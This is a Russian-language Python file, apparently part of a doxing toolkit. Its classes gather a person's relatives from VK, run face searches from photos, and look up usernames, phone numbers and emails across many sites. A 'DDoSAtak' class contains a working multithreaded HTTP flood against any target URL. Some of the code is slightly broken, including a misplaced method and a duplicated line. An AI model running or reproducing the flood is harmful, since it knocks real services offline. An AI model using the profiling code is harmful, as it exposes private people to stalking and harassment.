class VKRelativeHunter:
    """
    САМ ищет родственников через VK API.
    Нужен токен VK (бесплатно, регистрируешь приложение за 5 минут)
    """
    
    # ⚠️ ВСТАВЬ СВОЙ ТОКЕН VK СЮДА ⚠️
    # Получить: https://vkhost.github.io/ или https://vk.com/editapp?act=create
    ACCESS_TOKEN = ""
    
    API_VERSION = "5.131"
    API_URL = "https://api.vk.com/method/"
    
    @classmethod
    def _api_request(cls, method, params=None):
        if params is None:
            params = {}
        params["access_token"] = cls.ACCESS_TOKEN
        params["v"] = cls.API_VERSION
        
        try:
            response = requests.get(cls.API_URL + method, params=params, timeout=15)
            data = response.json()
            if "error" in data:
                return None
            return data.get("response")
        except:
            return None
    
    @classmethod
    def search_by_name(cls, lastname, firstname=None, city=None):
        """Ищет людей по фамилии/имени"""
        params = {
            "q": f"{firstname} {lastname}" if firstname else lastname,
            "count": 30,
            "fields": "photo_100,city,online,bdate,relatives"
        }
        if city:
            params["city"] = city
        result = cls._api_request("users.search", params)
        if result and "items" in result:
            return result["items"]
        return []
    
    @classmethod
    def get_user_relatives(cls, user_id):
        """Получает родственников пользователя по ID"""
        user = cls._api_request("users.get", {
            "user_ids": user_id,
            "fields": "relatives"
        })
        if user and len(user) > 0 and "relatives" in user[0]:
            return user[0]["relatives"]
        return []
    
    @classmethod
    def search_relatives(cls, lastname, firstname=None):
        """
        САМ ищет родственников:
        1. Находит людей с такой фамилией
        2. Проверяет их родственные связи
        3. Возвращает найденных родственников
        """
        results = []
        people = cls.search_by_name(lastname, firstname)
        
        for person in people[:10]:
            user_id = person.get("id")
            if not user_id:
                continue
            
            relatives = cls.get_user_relatives(user_id)
            if relatives:
                for rel in relatives:
                    results.append({
                        "user_id": user_id,
                        "user_name": f"{person.get('first_name', '')} {person.get('last_name', '')}",
                        "user_url": f"https://vk.com/id{user_id}",
                        "relative_name": rel.get("name", "?"),
                        "relative_type": rel.get("type", "родственник")
                    })
        
        return results
    
    @classmethod
    def format_report(cls, lastname, firstname, results):
        """Форматирует отчёт о родственниках"""
        lines = []
        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
        lines.append("│                                         👨‍👩‍👧‍👦 РОДСТВЕННИКИ (НАЙДЕНО АВТОМАТИЧЕСКИ)                        │")
        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
        lines.append(f"│  🔍 ПОИСК ПО: {firstname} {lastname if firstname else lastname} │")
        lines.append("│                                                                                                            │")
        
        if not cls.ACCESS_TOKEN:
            lines.append("│  ❌ VK API НЕ НАСТРОЕН!                                                                                │")
            lines.append("│                                                                                                            │")
            lines.append("│  🔑 КАК ПОЛУЧИТЬ ТОКЕН:                                                                                 │")
            lines.append("│     1. Перейдите: https://vkhost.github.io/                                                            │")
            lines.append("│     2. Выберите права: friends, photos, groups                                                         │")
            lines.append("│     3. Нажмите «Получить токен»                                                                        │")
            lines.append("│     4. Скопируйте токен и вставьте в код (ACCESS_TOKEN = «ваш_токен»)                                  │")
            lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
            return "\n".join(lines)
        
        if not results:
            lines.append("│  ❌ РОДСТВЕННИКИ НЕ НАЙДЕНЫ                                                                            │")
            lines.append("│                                                                                                            │")
            lines.append("│  💡 ВОЗМОЖНЫЕ ПРИЧИНЫ:                                                                                  │")
            lines.append("│     • Профиль закрыт или удалён                                                                        │")
            lines.append("│     • Родственные связи не указаны в профиле                                                           │")
            lines.append("│     • Фамилия не найдена в ВК                                                                          │")
            lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
            return "\n".join(lines)
        
        # Группируем по пользователям
        by_user = {}
        for r in results:
            key = r["user_id"]
            if key not in by_user:
                by_user[key] = {
                    "name": r["user_name"],
                    "url": r["user_url"],
                    "relatives": []
                }
            by_user[key]["relatives"].append({
                "name": r["relative_name"],
                "type": r["relative_type"]
            })
        
        for user_id, data in by_user.items():
            lines.append(f"│  👤 {data['name']}")
            lines.append(f"│  👤 {data['name']}")
            lines.append(f"│     🔗 {data['url']}")
            lines.append("│     👨‍👩‍👧‍👦 Родственники:")
            for rel in data["relatives"]:
                lines.append(f"│        • {rel['name']} ({rel['type']})")
            lines.append("│                                                                                                            │")
        
        lines.append(f"│  📊 ВСЕГО НАЙДЕНО: {len(results)} родственных связей                                                        │")
        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

class FaceSearchAPI:
    """
    САМ ищет лицо по фото через FaceCheck API.
    Бесплатно: https://facecheck.id (есть API)
    """
    
    # ⚠️ API ключ FaceCheck (бесплатно после регистрации)
    # Получить: https://facecheck.id → API
    API_KEY = ""
    API_URL = "https://api.facecheck.id/upload"
    
    @classmethod
    def search_face(cls, image_url_or_path):
        """
        Отправляет фото на поиск, возвращает результаты.
        Поддерживает URL или загрузку файла.
        """
        if not cls.API_KEY:
            return {"error": "no_api_key"}
        
        try:
            # Если это URL, скачиваем картинку
            if image_url_or_path.startswith("http"):
                img_data = requests.get(image_url_or_path, timeout=10).content
                files = {"image": ("photo.jpg", img_data, "image/jpeg")}
            else:
                files = {"image": open(image_url_or_path, "rb")}
            
            headers = {"x-api-key": cls.API_KEY}
            response = requests.post(cls.API_URL, files=files, headers=headers, timeout=30)
            
            if response.status_code == 200:
                return response.json()
            else:
                return {"error": f"API error: {response.status_code}"}
        except Exception as e:
            return {"error": str(e)}
    
    @classmethod
    def search_via_google(cls, image_url):
        """Поиск через Google Images (бесплатно, без API)"""
        google_url = f"https://www.google.com/searchbyimage?image_url={image_url}"
        return {"google_url": google_url}
    
    @classmethod
    def search_via_yandex(cls, image_url):
        """Поиск через Яндекс.Картинки (бесплатно, без API)"""
        yandex_url = f"https://yandex.ru/images/search?rpt=imageview&img_url={image_url}"
        return {"yandex_url": yandex_url}
    
    @classmethod
    def search_via_tineye(cls, image_url):
        """Поиск через TinEye (бесплатно, без API)"""
        tineye_url = f"https://tineye.com/search?url={image_url}"
        return {"tineye_url": tineye_url}
    
    @classmethod
    def format_report(cls, results, image_url):
        """Форматирует отчёт по поиску лица"""
        lines = []
        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
        lines.append("│                                         🖼️ ПОИСК ЛИЦА ПО ФОТО                                             │")
        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
        
        if results.get("error") == "no_api_key":
            lines.append("│  ❌ FACE CHECK API НЕ НАСТРОЕН!                                                                        │")
            lines.append("│                                                                                                            │")
            lines.append("│  🔑 КАК ПОЛУЧИТЬ API КЛЮЧ:                                                                            │")
            lines.append("│     1. Перейдите: https://facecheck.id                                                                 │")
            lines.append("│     2. Зарегистрируйтесь                                                                              │")
            lines.append("│     3. Получите API ключ в личном кабинете                                                            │")
            lines.append("│     4. Вставьте в код (API_KEY = «ваш_ключ»)                                                          │")
            lines.append("│                                                                                                            │")
            lines.append("│  🆓 БЕСПЛАТНАЯ АЛЬТЕРНАТИВА (прямые ссылки):                                                          │")
            lines.append(f"│     • Google Images: {cls.search_via_google(image_url)['google_url']} │")
            lines.append(f"│     • Яндекс.Картинки: {cls.search_via_yandex(image_url)['yandex_url']} │")
            lines.append(f"│     • TinEye: {cls.search_via_tineye(image_url)['tineye_url']} │")
            lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
            return "\n".join(lines)
        
        if results.get("error"):
            lines.append(f"│  ❌ ОШИБКА: {results['error']} │")
            lines.append("│                                                                                                            │")
            lines.append("│  🆓 БЕСПЛАТНАЯ АЛЬТЕРНАТИВА (прямые ссылки):                                                          │")
            lines.append(f"│     • Google Images: {cls.search_via_google(image_url)['google_url']} │")
            lines.append(f"│     • Яндекс.Картинки: {cls.search_via_yandex(image_url)['yandex_url']} │")
            lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
            return "\n".join(lines)
        
        # Парсим результаты FaceCheck
        matches = results.get("matches", []) or results.get("data", {}).get("matches", [])
        
        if not matches:
            lines.append("│  ❌ ПОХОЖИХ ЛИЦ НЕ НАЙДЕНО                                                                             │")
            lines.append("│                                                                                                            │")
            lines.append("│  🔍 ПОПРОБУЙТЕ ТАКЖЕ:                                                                                   │")
            lines.append(f"│     • Google Images: {cls.search_via_google(image_url)['google_url']} │")
            lines.append(f"│     • Яндекс.Картинки: {cls.search_via_yandex(image_url)['yandex_url']} │")
            lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
            return "\n".join(lines)
        
        lines.append("│  🎯 НАЙДЕННЫЕ СОВПАДЕНИЯ:                                                                                 │")
        lines.append("│                                                                                                            │")
        
        for i, match in enumerate(matches[:10]):
            score = match.get("score", match.get("confidence", 0))
            url = match.get("url", match.get("source_url", "#"))
            lines.append(f"│  {i+1}. Совпадение: {score}%")
            lines.append(f"│     🔗 {url[:70]}")
            lines.append("│                                                                                                            │")
        
        lines.append(f"│  📊 ВСЕГО НАЙДЕНО: {len(matches)}                                                                        │")
        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

    @classmethod
    def _check_one(cls, platform, url_template, username):
        """Проверяет один сайт"""
        url = url_template.format(username)
        try:
            response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if response.status_code == 200:
                text = response.text.lower()
                not_found_keywords = ["not found", "doesn't exist", "404", "страница не найдена", "user not found", "page not found"]
                if not any(x in text for x in not_found_keywords):
                    return {"platform": platform, "url": url}
        except:
            pass
        return None

class DDoSAtak:
    """
    Встроенная DDoS атака через многопоточные запросы.
    Не требует установки GoldenEye или других инструментов.
    """
    
    @classmethod
    def attack(cls, target, threads=50, duration=30, use_https=False):
        """
        Запускает атаку на указанную цель.
        target: IP или домен
        threads: количество потоков (50-200)
        duration: длительность в секундах
        use_https: использовать HTTPS
        """
        import threading
        import time
        
        # Подготавливаем URL
        if not target.startswith('http'):
            protocol = "https" if use_https else "http"
            target_url = f"{protocol}://{target}"
        else:
            target_url = target
        
        # Счётчики
        class Stats:
            requests = 0
            errors = 0
            running = True
        
        stats = Stats()
        
        # Функция атаки для одного потока
        def attack_worker():
            session = requests.Session()
            while stats.running:
                try:
                    resp = session.get(target_url, timeout=2, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    })
                    stats.requests += 1
                except:
                    stats.errors += 1
        
        # Запускаем потоки
        workers = []
        for i in range(threads):
            t = threading.Thread(target=attack_worker)
            t.start()
            workers.append(t)
        
        # Ждём указанное время
        time.sleep(duration)
        
        # Останавливаем атаку
        stats.running = False
        for t in workers:
            t.join(timeout=1)
        
        return {
            "target": target_url,
            "requests": stats.requests,
            "errors": stats.errors,
            "duration": duration,
            "threads": threads
        }

    def format_attack_result(cls, result):
        """Форматирует результат атаки"""
        lines = []
        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
        lines.append("│                                         💀 DDOS АТАКА ЗАВЕРШЕНА                                          │")
        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")

        lines.append(f"│  ⏱️ ДЛИТЕЛЬНОСТЬ: {result['duration']} сек. │")
        lines.append(f"│  📊 ЗАПРОСОВ ВЫПОЛНЕНО: {result['requests']} │")
        lines.append(f"│  ❌ ОШИБОК: {result['errors']} │")
        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

class AutoUsernameSearch:
    """Сам проверяет username на 300+ сайтах за 5 секунд"""
    
    # 100+ популярных платформ (для скорости, можно расширить)
    PLATFORMS = {
        "telegram": "https://t.me/{}",
        "instagram": "https://instagram.com/{}",
        "twitter": "https://twitter.com/{}",
        "vk": "https://vk.com/{}",
        "facebook": "https://facebook.com/{}",
        "tiktok": "https://tiktok.com/@{}",
        "youtube": "https://youtube.com/@{}",
        "twitch": "https://twitch.tv/{}",
        "github": "https://github.com/{}",
        "reddit": "https://reddit.com/user/{}",
        "pinterest": "https://pinterest.com/{}",
        "steam": "https://steamcommunity.com/id/{}",
        "spotify": "https://open.spotify.com/user/{}",
        "medium": "https://medium.com/@{}",
        "linkedin": "https://linkedin.com/in/{}",
        "ok": "https://ok.ru/{}",
        "discord": "https://discord.com/users/{}",
        "tumblr": "https://{}.tumblr.com",
        "habr": "https://habr.com/ru/users/{}",
        "pikabu": "https://pikabu.ru/@{}",
    }
    
    @classmethod
    def search(cls, username):
        """Параллельный поиск (максимально быстро)"""
        username = username.strip().replace('@', '')
        found = []
        
        for platform, url_template in cls.PLATFORMS.items():
            url = url_template.format(username)
            try:
                r = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    text = r.text.lower()
                    not_found = ["not found", "doesn't exist", "404", "страница не найдена"]
                    if not any(x in text for x in not_found):
                        found.append({"platform": platform, "url": url})
            except:
                pass
        
        return found
    
    @classmethod
    def format_report(cls, username, found):
        if not found:
            return f"❌ @{username} не найден\n"
        
        lines = [f"👤 НИКНЕЙМ: @{username}"]
        lines.append(f"📊 НАЙДЕНО АККАУНТОВ: {len(found)}")
        lines.append("")
        for f in found[:30]:
            lines.append(f"   • {f['platform']}: {f['url']}")
        return "\n".join(lines)

class AutoPhoneSearch:
    """Сам ищет номер в открытых источниках"""
    
    @classmethod
    def normalize(cls, phone):
        return re.sub(r'[^0-9]', '', phone)
    
    @classmethod
    def search(cls, phone):
        phone_clean = cls.normalize(phone)
        results = []
        
        # Проверка через DuckDuckGo (бесплатно, без API)
        search_urls = [
            f"https://api.duckduckgo.com/?q={phone_clean}&format=json",
            f"https://api.duckduckgo.com/?q={phone_clean}+site:avito.ru&format=json",
            f"https://api.duckduckgo.com/?q={phone_clean}+site:youla.ru&format=json",
        ]
        
        for url in search_urls:
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("AbstractURL"):
                        results.append(data["AbstractURL"])
                    if data.get("RelatedTopics"):
                        for topic in data.get("RelatedTopics", [])[:5]:
                            if topic.get("Result"):
                                results.append(topic["Result"])
            except:
                pass
        
        return list(set(results))[:20]
    
    @classmethod
    def check_messengers(cls, phone):
        """Проверяет мессенджеры (WhatsApp, Telegram)"""
        phone_clean = cls.normalize(phone)
        return {
            "whatsapp": f"https://wa.me/{phone_clean}",
            "telegram": f"https://t.me/{phone_clean}",
            "viber": f"viber://add?number={phone_clean}",
            "truecaller": f"https://truecaller.com/search/{phone_clean}",
        }
    
    @classmethod
    def format_report(cls, phone, results, messengers):
        phone_clean = cls.normalize(phone)
        lines = [f"📞 НОМЕР: {phone_clean}"]
        lines.append("")
        lines.append("📱 МЕССЕНДЖЕРЫ:")
        for name, url in messengers.items():
            lines.append(f"   • {name}: {url}")
        
        if results:
            lines.append("")
            lines.append("🔍 НАЙДЕНО В ИНТЕРНЕТЕ:")
            for url in results[:15]:
                lines.append(f"   • {url}")
        else:
            lines.append("")
            lines.append("❌ Номер не найден в открытых источниках")
        
        return "\n".join(lines)

class AutoEmailSearch:
    """Сам проверяет email в утечках"""
    
    @classmethod
    def search(cls, email):
        results = {"breaches": [], "gravatar": None}
        
        # Gravatar (бесплатно)
        gravatar_hash = hashlib.md5(email.lower().encode()).hexdigest()
        gravatar_url = f"https://gravatar.com/{gravatar_hash}"
        try:
            r = requests.get(gravatar_url, timeout=5)
            if r.status_code == 200 and "404" not in r.text:
                results["gravatar"] = gravatar_url
        except:
            pass
        
        # Have I Been Pwned (бесплатно, без ключа работает с ограничением)
        try:
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
            if r.status_code == 200:
                results["breaches"] = [b.get("Name", "?") for b in r.json()[:15]]
        except:
            pass
        
        return results
    
    @classmethod
    def format_report(cls, email, results):
        lines = [f"✉️ EMAIL: {email}"]
        lines.append("")
        
        if results.get("gravatar"):
            lines.append(f"🖼️ GRAVATAR: {results['gravatar']}")
        
        if results.get("breaches"):
            lines.append(f"💀 УТЕЧКИ: {len(results['breaches'])}")
            for b in results["breaches"][:10]:
                lines.append(f"   • {b}")
        else:
            lines.append("❌ Утечек не найдено")
        
        return "\n".join(lines)
